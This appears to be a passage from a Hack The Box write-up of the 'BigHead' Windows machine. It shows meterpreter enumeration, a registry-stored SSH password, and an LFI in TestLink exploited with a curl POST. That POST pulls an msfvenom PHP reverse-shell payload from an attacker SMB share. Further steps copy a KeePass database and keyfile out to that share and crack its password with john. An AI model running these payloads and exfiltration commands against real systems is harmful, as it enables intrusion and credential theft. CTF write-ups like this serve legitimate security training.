 / ( ` )   '| ( ' )  |   ,-./  )    / `-' \  | ,_/  \__) |   |  ( ' )         
. (_ o _)  ||(_ o _) /   \  '_ '`)   `-'`"`,-./  )       |   '-(_{;}_)        
|  (_,_)___|| (_,_).' __  > (_)  )   .---. \  '_ '`)     |      (_,_)         
'  \   .---.|  |\ \  |  |(  .  .-'   |   |  > (_)  )  __ | _ _--.   |         
 \  `-'    /|  | \ `'   / `-'`-'|___ |   | (  .  .-'_/  )|( ' ) |   |         
  \       / |  |  \    /   |        \|   |  `-'`-'     / (_{;}_)|   |         
   `'-..-'  ''-'   `'-'    `--------`'---'    `._____.'  '(_,_) '---'         
          .---.       ,-----.    ,---.  ,---.   .-''-.     .-'''-.            
          | ,_|     .'  .-,  '.  |   /  |   | .'_ _   \   / _     \           
        ,-./  )    / ,-.|  \ _ \ |  |   |  .'/ ( ` )   ' (`' )/`--'           
        \  '_ '`) ;  \  '_ /  | :|  | _ |  |. (_ o _)  |(_ o _).              
         > (_)  ) |  _`,/ \ _/  ||  _( )_  ||  (_,_)___| (_,_). '.            
        (  .  .-' : (  '\_/ \   ;\ (_ o._) /'  \   .---..---.  \  :           
         `-'`-'|___\ `"/  \  ) /  \ (_,_) /  \  `-'    /\    `-'  |           
          |        \'. \_/``".'    \     /    \       /  \       /            
          `--------`  '-----'       `---`      `'-..-'    `-...-'             
                ,---------. .---.  .---.     .-''-.                           
                \          \|   |  |_ _|   .'_ _   \                          
                 `--.  ,---'|   |  ( ' )  / ( ` )   '                         
                    |   \   |   '-(_{;}_). (_ o _)  |                         
                    :_ _:   |      (_,_) |  (_,_)___|                         
                    (_I_)   | _ _--.   | '  \   .---.                         
                   (_(=)_)  |( ' ) |   |  \  `-'    /                         
                    (_I_)   (_{;}_)|   |   \       /                          
                    '---'   '(_,_) '---'    `'-..-'                           
                             .---.  .---.    ____       .-'''-. .---.  .---.  
      .-,                    |   |  |_ _|  .'  __ `.   / _     \|   |  |_ _|  
   ,-.|  \ _                 |   |  ( ' ) /   '  \  \ (`' )/`--'|   |  ( ' )  
   \  '_ /  |                |   '-(_{;}_)|___|  /  |(_ o _).   |   '-(_{;}_) 
   _`,/ \ _/                 |      (_,_)    _.-`   | (_,_). '. |      (_,_)  
  (  '\_/ \                  | _ _--.   | .'   _    |.---.  \  :| _ _--.   |  
   `"/  \  )                 |( ' ) |   | |  _( )_  |\    `-'  ||( ' ) |   |  
     \_/``"                  (_{;}_)|   | \ (_ o _) / \       / (_{;}_)|   |  
                             '(_,_) '---'  '.(_,_).'   `-...-'  '(_,_) '---'  
```

Doing some enumeration next...

System info:

```
meterpreter > getuid
Server username: PIEDPIPER\Nelson

meterpreter > sysinfo
Computer        : PIEDPIPER
OS              : Windows 2008 (Build 6002, Service Pack 2).
Architecture    : x86
System Language : en_GB
Domain          : DEVELOPMENT
Logged On Users : 5
Meterpreter     : x86/windows
```

Installed programs:

Notice SSH is installed, 7-Zip and Keepass.

```
meterpreter > run post/windows/gather/enum_applications 

[*] Enumerating applications installed on PIEDPIPER

Installed Applications
======================

 Name                                                              Version
 ----                                                              -------
 7-Zip 18.05                                                       18.05
 Bitnami TestLink Module                                           1.9.17-0
 Bitvise SSH Server 7.44 (remove only)                             7.44
 Hotfix for Microsoft .NET Framework 3.5 SP1 (KB953595)            1
 Hotfix for Microsoft .NET Framework 3.5 SP1 (KB958484)            1
 KeePass Password Safe 2.40                                        2.40
 Microsoft .NET Framework 3.5 SP1                                  3.5.30729
 Microsoft .NET Framework 4.5.2                                    4.5.51209
 Microsoft .NET Framework 4.5.2                                    4.5.51209
 Microsoft Visual C++ 2008 Redistributable - x86 9.0.21022         9.0.21022
 Microsoft Visual C++ 2008 Redistributable - x86 9.0.30729.6161    9.0.30729.6161
 Mozilla Firefox 52.9.0 ESR (x86 en-GB)                            52.9.0
 Notepad++ (32-bit x86)                                            7.5.9
 Oracle VM VirtualBox Guest Additions 5.2.12                       5.2.12.0
 Python 2.7.15                                                     2.7.15150
 Security Update for Microsoft .NET Framework 3.5 SP1 (KB2604111)  1
 Security Update for Microsoft .NET Framework 3.5 SP1 (KB2736416)  1
 Security Update for Microsoft .NET Framework 3.5 SP1 (KB2840629)  1
 Security Update for Microsoft .NET Framework 3.5 SP1 (KB2861697)  1
 Update for Microsoft .NET Framework 3.5 SP1 (KB963707)            1
 Update for Microsoft .NET Framework 4.5.2 (KB4040977)             1
 Update for Microsoft .NET Framework 4.5.2 (KB4096495)             1
 Update for Microsoft .NET Framework 4.5.2 (KB4098976)             1
 Update for Microsoft .NET Framework 4.5.2 (KB4338417)             1
 Update for Microsoft .NET Framework 4.5.2 (KB4344149)             1
 Update for Microsoft .NET Framework 4.5.2 (KB4457019)             1
 Update for Microsoft .NET Framework 4.5.2 (KB4457038)             1
 Update for Microsoft .NET Framework 4.5.2 (KB4459945)             1
 VMware Tools                                                      10.1.15.6677369
 XAMPP                                                             5.6.36-0
```

A local service is also listening on port 2020:

```
C:\nginx>netstat -an
netstat -an

Active Connections

  Proto  Local Address          Foreign Address        State
  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING
  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING
  TCP    0.0.0.0:2020           0.0.0.0:0              LISTENING
```

To access it remotely we can use the `portfwd` command within meterpreter:

```
meterpreter > portfwd add -l 2020 -p 2020 -r 127.0.0.1
[*] Local TCP relay created: :2020 <-> 127.0.0.1:2020
```

It's some kind of SSH server: `Bitvise SSH Server (WinSSHD)`

```
# nc -nv 127.0.0.1 2020
Ncat: Version 7.70 ( https://nmap.org/ncat )
Ncat: Connected to 127.0.0.1:2020.
SSH-2.0-7.44 FlowSsh: Bitvise SSH Server (WinSSHD) 7.44: free only for personal non-commercial use
```
	
I don't have the credentials so I looked for a while in the registry and eventually found a needle in the haystack.

```
meterpreter > search -f *nginx*
Found 14 results...
    c:\nginx\nginx.exe (3115008 bytes)
    c:\nginx\conf\nginx-orig.conf (2773 bytes)
    c:\nginx\conf\nginx.conf (6608 bytes)
    c:\nginx\conf\nginx.conf_bkp (4525 bytes)
    c:\nginx\contrib\geo2nginx.pl (1272 bytes)
    c:\nginx\contrib\unicode2nginx\unicode-to-nginx.pl (1090 bytes)
    c:\nginx\contrib\vim\ftdetect\nginx.vim (198 bytes)
    c:\nginx\contrib\vim\ftplugin\nginx.vim (29 bytes)
    c:\nginx\contrib\vim\indent\nginx.vim (250 bytes)
    c:\nginx\contrib\vim\syntax\nginx.vim (125645 bytes)
    c:\nginx\logs\nginx.pid (6 bytes)
    c:\ProgramData\Microsoft\User Account Pictures\nginx.dat
    c:\Users\All Users\Microsoft\User Account Pictures\nginx.dat
    c:\Windows\System32\nginx.reg (4268 bytes)
```	

The `nginx.reg` stands out:

```
C:\users\nelson>type c:\Windows\System32\nginx.reg
type c:\Windows\System32\nginx.reg
Windows Registry Editor Version 5.00

[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\nginx]
"Type"=dword:00000010
"Start"=dword:00000002
"ErrorControl"=dword:00000001
"ImagePath"=hex(2):43,00,3a,00,5c,00,50,00,72,00,6f,00,67,00,72,00,61,00,6d,00,\
  20,00,46,00,69,00,6c,00,65,00,73,00,5c,00,6e,00,73,00,73,00,6d,00,5c,00,77,\
  00,69,00,6e,00,33,00,32,00,5c,00,6e,00,73,00,73,00,6d,00,2e,00,65,00,78,00,\
  65,00,00,00
"DisplayName"="Nginx"
"ObjectName"=".\\nginx"
"Description"="Nginx web server and proxy."
"DelayedAutostart"=dword:00000000
"FailureActionsOnNonCrashFailures"=dword:00000001
"FailureActions"=hex:00,00,00,00,00,00,00,00,00,00,00,00,03,00,00,00,14,00,00,\
  00,01,00,00,00,60,ea,00,00,01,00,00,00,60,ea,00,00,01,00,00,00,60,ea,00,00
"Authenticate"=hex:48,00,37,00,33,00,42,00,70,00,55,00,59,00,32,00,55,00,71,00,39,00,55,00,2d,00,59,00,75,00,67,00,79,00,74,00,35,00,46,00,59,00,55,00,62,00,59,00,30,00,2d,00,55,00,38,00,37,00,74,00,38,00,37,00,00,00,00,00
"PasswordHash"="336d72676e6333205361797a205472794861726465722e2e2e203b440a"

[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\nginx\Parameters]
"Application"=hex(2):43,00,3a,00,5c,00,6e,00,67,00,69,00,6e,00,78,00,5c,00,6e,\
  00,67,00,69,00,6e,00,78,00,2e,00,65,00,78,00,65,00,00,00
"AppParameters"=hex(2):00,00
"AppDirectory"=hex(2):43,00,3a,00,5c,00,6e,00,67,00,69,00,6e,00,78,00,00,00
"AppStdin"=hex(2):73,00,74,00,61,00,72,00,74,00,20,00,6e,00,67,00,69,00,6e,00,\
  78,00,00,00
"AppStdout"=hex(2):43,00,3a,00,5c,00,6e,00,67,00,69,00,6e,00,78,00,5c,00,6c,00,\
  6f,00,67,00,73,00,5c,00,73,00,65,00,72,00,76,00,69,00,63,00,65,00,2e,00,6f,\
  00,75,00,74,00,2e,00,6c,00,6f,00,67,00,00,00
"AppStderr"=hex(2):43,00,3a,00,5c,00,6e,00,67,00,69,00,6e,00,78,00,5c,00,6c,00,\
  6f,00,67,00,73,00,5c,00,65,00,72,00,72,00,6f,00,72,00,2e,00,6c,00,6f,00,67,\
  00,00,00

[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\nginx\Parameters\AppExit]
@="Restart"

[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\nginx\Enum]
"0"="Root\\LEGACY_NGINX\\0000"
"Count"=dword:00000001
"NextInstance"=dword:00000001
```

The `Authenticate` key contains: `48,00,37,00,33,00,42,00,70,00,55,00,59,00,32,00,55,00,71,00,39,00,55,00,2d,00,59,00,75,00,67,00,79,00,74,00,35,00,46,00,59,00,55,00,62,00,59,00,30,00,2d,00,55,00,38,00,37,00,74,00,38,00,37,00,00,00,00,00`

I like using Cyberchef to decode and convert data, it's much faster to try different filters/conversion than coding it in python.

![](/assets/images/htb-writeup-bighead/ssh_password.png)

Password: `H73BpUY2Uq9U-Yugyt5FYUbY0-U87t87`

I can now SSH in with user `nginx` but I'm stuck in some sort of limited shell:
```
# ssh -p 2020 nginx@127.0.0.1
nginx@127.0.0.1's password: --> `H73BpUY2Uq9U-Yugyt5FYUbY0-U87t87`

bvshell:/$ whoami
whoami: Command not found.

bvshell:/$ pwd
/

bvshell:/$ ls
anonymous             apache                apache_start.bat      apache_stop.bat       apps                  catalina_service.bat  catalina_start.bat    catalina_stop.bat     cgi-bin
contrib               ctlscript.bat         FileZillaFTP          filezilla_setup.bat   filezilla_start.bat   filezilla_stop.bat    htdocs                img                   install
licenses              locale                mailoutput            mailtodisk            MercuryMail           mercury_start.bat     mercury_stop.bat      mysql                 mysql_start.bat
mysql_stop.bat        nginx.exe             passwords.txt         perl                  php                   phpMyAdmin            properties.ini        readme_de.txt         readme_en.txt
RELEASENOTES          sendmail              service.exe           setup_xampp.bat       src                   test_php.bat          tmp                   tomcat                uninstall.dat
uninstall.exe         user.txt              webalizer             webdav                xampp-control.exe     xampp-control.ini     xampp-control.log     xampp_shell.bat       xampp_start.exe
xampp_stop.exe
```

I checked out the Bitvise website for information on `bvshell` and saw that it's some kind of chroot jail:

![](/assets/images/htb-writeup-bighead/bvshell.png)

That would explain why the above directory listing of the root directory shows the content of xampp and not the root of the Windows server.

There's a `user.txt` file in the directory but I can't seem to read it.
```
bvshell:/$ cat user.txt
-bvshell: Reading binary file as a text.
```

### Local File Include

The Testlink application is located in `/apps/testlink/htdocs`.

The `linkto.php` file contains an LFI, the important code is shown below:

```php
// alpha 0.0.1 implementation of our new pipercoin authentication tech
// full API not done yet. just submit tokens with requests for now.
if(isset($_POST['PiperID'])){$PiperCoinAuth = $_POST['PiperCoinID']; //plugins/ppiper/pipercoin.php
        $PiperCoinSess = base64_decode($PiperCoinAuth);
				$PiperCoinAvitar = (string)$PiperCoinSess;}
[...]  
require_once($PiperCoinAuth); 
```

When I do a GET request on linkto.php, I get the following error message:

```
Fatal error: require_once(): Failed opening required '' (include_path='C:\xampp\php\PEAR;.;C:\xampp\apps\testlink\htdocs\lib\functions\;C:\xampp\apps\testlink\htdocs\lib\issuetrackerintegration\;C:\xampp\apps\testlink\htdocs\lib\codetrackerintegration\;C:\xampp\apps\testlink\htdocs\lib\reqmgrsystemintegration\;C:\xampp\apps\testlink\htdocs\third_party\') in C:\xampp\apps\testlink\htdocs\linkto.php on line 62
```

The `linkto.php` has a `require_once($PiperCoinAuth)` command, and because `$PiperCoinAuth` is under direct control of users through the POST PiperCoinID parameter, we can include any arbitrary PHP file.

I generated a PHP meterpreter payload.

```
# msfvenom -p php/meterpreter/reverse_tcp -o met.php LHOST=10.10.14.23 LPORT=4444
[-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload
[-] No arch selected, selecting arch: php from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 1112 bytes
Saved as: met.php
```

Then sent a POST request to execute PHP code through my SMB server

```
# curl -XPOST --data "PiperID=1&PiperCoinID=\\\\10.10.14.23\share\met.php" http://code.bighead.htb/testlink/linkto.php
```

Finally, I get a proper shell as SYSTEM on the target system

```
msf5 exploit(multi/handler) > [*] Encoded stage with php/base64
[*] Sending encoded stage (51106 bytes) to 10.10.10.112
[*] Meterpreter session 4 opened (10.10.14.23:4444 -> 10.10.10.112:49159) at 2019-05-02 21:06:18 -0400

msf5 exploit(multi/handler) > sessions 4
[*] Starting interaction with 4...

meterpreter > getuid
Server username: SYSTEM (0)
```
Got user flag:
``` 
meterpreter > cat /users/nginx/desktop/user.txt
5f158a...
```

### Getting root.txt from Keepass

The `root.txt` is yet another troll:

```
meterpreter > cat /users/administrator/desktop/root.txt

                    * * *

              Gilfoyle's Prayer
     
___________________6666666___________________ 
____________66666__________66666_____________ 
_________6666___________________666__________ 
_______666__6____________________6_666_______ 
_____666_____66_______________666____66______ 
____66_______66666_________66666______666____ 
___66_________6___66_____66___66_______666___ 
__66__________66____6666_____66_________666__ 
_666___________66__666_66___66___________66__ 
_66____________6666_______6666___________666_ 
_66___________6666_________6666__________666_ 
_66________666_________________666_______666_ 
_66_____666______66_______66______666____666_ 
_666__666666666666666666666666666666666__66__ 
__66_______________6____66______________666__ 
___66______________66___66_____________666___ 
____66______________6__66_____________666____ 
_______666___________666___________666_______ 
_________6666_________6_________666__________ 
____________66666_____6____66666_____________ 
___________________6666666________________

   Prayer for The Praise of Satan's Kingdom

              Praise, Hail Satan!
   Glory be to Satan the Father of the Earth
       and to Lucifer our guiding light
    and to Belial who walks between worlds
     and to Lilith the queen of the night
    As it was in the void of the beginning
                   Is now, 
and ever shall be, Satan's kingdom without End

                so it is done.

                    * * *
```

When I started a shell my PHP meterpreter kept dropping so I used the `multi/manage/upload_exec` metasploit module to upload an .exe meterpreter and get another meterpreter session. This time I could spawn a shell without losing access.

```
msf5 post(multi/manage/upload_exec) > run

[*] Uploading /root/htb/bighead/met.exe to met.exe
[*] Executing command: met.exe
[*] Encoded stage with x86/shikata_ga_nai
[*] Sending encoded stage (179808 bytes) to 10.10.10.112

[*] Meterpreter session 7 opened (10.10.14.23:5555 -> 10.10.10.112:49167) at 2019-05-02 21:19:51 -0400

meterpreter > shell
Process 3316 created.
Channel 1 created.
Microsoft Windows [Version 6.0.6002]
Copyright (c) 2006 Microsoft Corporation.  All rights reserved.

C:\xampp\apps\testlink\htdocs>whoami
whoami
nt authority\system
```

The administrator's `C:\Users\Administrator\AppData\Roaming\KeePass` directory contains a Keepass configuration file: `keepass.config.xml`. It contains the name of the last keyfile used : `admin.png` and the database file: `root.txt`. Notice that the file name is `root.txt:Zone.Identifier` and not just `root.txt` so this means we are looking at NTFS alternate data streams here.

```
[...]
<Association>
<DatabasePath>..\..\Users\Administrator\Desktop\root.txt:Zone.Identifier</DatabasePath>
<Password>true</Password>
<KeyFilePath>..\..\Users\Administrator\Pictures\admin.png</KeyFilePath>
</Association>
[...]
```

We can check this by doing `dir /r` in the Desktop folder and we can see:

```
C:\Users\Administrator\Desktop>dir /ah
dir /ah
 Volume in drive C has no label.
 Volume Serial Number is 7882-4E78

 Directory of C:\Users\Administrator\Desktop

06/10/2018  14:33             1,519 root.txt
               1 File(s)          1,519 bytes
               0 Dir(s)  16,316,542,976 bytes free

C:\Users\Administrator\Desktop>dir /r /ah
dir /r /ah
 Volume in drive C has no label.
 Volume Serial Number is 7882-4E78

 Directory of C:\Users\Administrator\Desktop

06/10/2018  14:33             1,519 root.txt
                              7,294 root.txt:Zone.Identifier:$DATA
               1 File(s)          1,519 bytes
               0 Dir(s)  16,316,542,976 bytes free

```

Because the box only has powershell version 2, I can't use the `-stream` flag to extract the ADS. But I found by pure luck that copying the file over SMB will automatically extract the data stream and create two files on my VM:

```
C:\Users\Administrator\Desktop>attrib -h root.txt

C:\Users\Administrator\Desktop>copy root.txt \\10.10.14.23\share
        1 file(s) copied.

[...]

-rwxr-xr-x  1 root root   1519 Dec 31  1969 root.txt
-rwxr-xr-x  1 root root   7294 Oct  6 10:33 root.txt:Zone.Identifier
```

I also copied the keyfile `admin.png`, then renamed `root.txt:Zone.Identifier` file to a .kdbx extension:

```
C:\Users\Administrator\Desktop>copy ..\pictures\admin.png \\10.10.14.23\share
copy ..\pictures\admin.png \\10.10.14.23\share
        1 file(s) copied.
```

```        
# file root.kdbx 
root.kdbx: Keepass password database 2.x KDBX
```

When I tried to use keepass2john it didn't work and just aborted without extracting the hash:

```
# keepass2john -k admin.png root.kdbx
admin.png
Aborted
```

Keepass uses the sha256 hash of the keyfile mixed with the password to produce the hash. In this case though the keyfile results in a hash that starts with a null byte so that seems to create a problem with keepass2john:

```
# sha256sum admin.png 
0063c12d1bf2ac03fb677e1915d1e96e3ab2cb7e381a186e58e8a06c5a296f39  admin.png
```

The fix was to just upgrade John to the latest version and I was able to get the hash after:

```
# keepass2john -k admin.png root.kdbx 
root:$keepass$*2*1*0*ea5626a6904620cad648168ef3f1968766f0b5f527c9a8028c1c1b03f2490449*cb3114b5089ffddbb3d607e490176e5e8da3022fc899fad5f317f1e4ebf4c268*a0b68d67dca93aee8f9804c28dac5995*afd02b46e630ff764adb50b7a2aae99d8961b1ab4676aff41c21dca19550c9ac*43c6588d17bceedbd00ed20d5ea310b82170252e29331671cc8aea3edd094ef6*1*64*0063c12d1bf2ac03fb677e1915d1e96e3ab2cb7e381a186e58e8a06c5a296f39
```

Then it didn't take long to crack the password: `darkness`

```
# john -w=/usr/share/wordlists/rockyou.txt hash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (KeePass [SHA256 AES 32/64 OpenSSL])
Cost 1 (iteration count) is 1 for all loaded hashes
Cost 2 (version) is 2 for all loaded hashes
Cost 3 (algorithm [0=AES, 1=TwoFish, 2=ChaCha]) is 0 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
darkness         (root)
1g 0:00:00:00 DONE (2019-05-02 21:35) 100.0g/s 73600p/s 73600c/s 73600C/s dreamer..raquel
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

I used `kpcli` to open the KeePass database and found the `root.txt` hash inside.

```
# kpcli --key admin.png --kdb root.kdbx
Please provide the master password: *************************

KeePass CLI (kpcli) v3.1 is ready for operation.
Type 'help' for a description of available commands.
Type 'help <command>' for details on individual commands.

kpcli:/> ls
=== Groups ===
chest/
kpcli:/> ls chest
=== Groups ===
hash/
kpcli:/> ls chest/hash
=== Entries ===
1. root.txt

kpcli:/> show -f 0

Title: root.txt
Uname: Gilfoyle
 Pass: 436b83...
  URL: 
Notes: HTB FTW!
```